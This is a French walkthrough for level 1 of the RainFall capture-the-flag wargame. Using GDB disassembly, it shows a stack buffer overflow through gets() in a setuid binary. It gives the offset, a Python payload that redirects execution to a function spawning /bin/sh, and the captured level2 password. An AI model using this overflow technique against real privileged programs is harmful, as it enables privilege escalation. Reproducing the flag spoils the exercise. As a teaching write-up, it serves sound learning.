```markdown
### Level 1

Quand on se connecte au level1, il y a un exécutable:

```bash
level1@RainFall:~$ ./level1
[attend une entrée...]
test
[ne se passe rien, le programme se termine]
```

Le programme attend quelque chose en entrée, puis se termine sans rien faire d'apparent.

```bash
level1@RainFall:~$ ls -l level1
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

Le propriétaire du binaire est level2. Ça signifie que si on exploite ce programme, on obtiendra les privilèges de level2 et pourra lire son fichier .pass.

### Analyse avec GDB

```bash
gdb ./level1
(gdb) info functions
```

On découvre 2 fonctions:
- main : celle qui s'exécute
- run : celle qui n'est jamais appelée

Analysons main:

```bash
(gdb) disassemble main
```

On voit ceci:

```bash
sub    $0x50,%esp        # Alloue des bytes sur la stack
lea    -0x50(%ebp),%eax  # Charge l'adresse du buffer
mov    %eax,(%esp)       # Passe cette adresse à gets
call   gets              # Appelle gets()
```

Le programme alloue un buffer et appelle gets() pour lire l'entrée utilisateur.

Pour run():

```bash
(gdb) disassemble run
```

On voit:

```bash
call   fwrite            # Affiche "Good... Wait what?"
movl   $0x8048584,(%esp) # Met "/bin/sh" en argument
call   system            # Lance un shell
```

La fonction run() lance un shell, mais elle n'est jamais appelée dans le flux normal du programme.

### La faille

La faille vient de gets(). Cette fonction ne vérifie pas la taille de l'input. Si on écrit 100, 1000 chars... elle continuera à écrire dans la mémoire, au dela du buffer prévu.

Organisation de la stack :

```bash
[buffer] # buffer
[saved EBP] # 4 bytes
[saved EIP] # 4 bytes >>> adresse de retour: notre cible
```

Quand main() termine, le processeur lit EIP (addr retour) pour savoir où continuer l'exécution. 

Si on écrase cette valeur avec l'adresse de run(), le programme sautera vers run() au lieu de se terminer normalement.

### Trouver le bon offset

Il faut savoir combien de caractères écrire avant d'atteindre EIP.

La structure réelle de la stack est:

```bash
[76 bytes] # buffer utilisable
[4 bytes] # saved EIP (c'est ici qu'on veut écrire)
```

Pour atteindre saved EIP, on envoie:
- 76 bytes qui remplissent le buffer et écrasent saved EBP
- 4 bytes qui écrasent saved EIP avec l'adresse de run()

### Trouver l'adresse de run()

```bash
(gdb) print run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

L'adresse est 0x08048444.

### Construction de l'exploit

On doit envoyer:
- 76 bytes de padding (n'importe quoi, on utilise des "A")
- L'adresse de run() en little-endian: \x44\x84\x04\x08

```bash
python -c "print('A'*76 + '\x44\x84\x04\x08')"
```

### Premier test

```bash
python -c "print('A'*76 + '\x44\x84\x04\x08')" | ./level1
```

Output:
```
Good... Wait what?
Segmentation fault
```

Ça marche ! La fonction run() s'est exécutée (on voit le message), puis system("/bin/sh") a lancé un shell, mais le shell se ferme immédiatement.

### Stabiliser le shell

Pour garder stdin ouvert:

```bash
(python -c "print('A'*76 + '\x44\x84\x04\x08')"; cat) | ./level1
```

Le "cat" sans argument lit depuis stdin et le maintient ouvert. Maintenant:

```bash
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Flag trouvé
```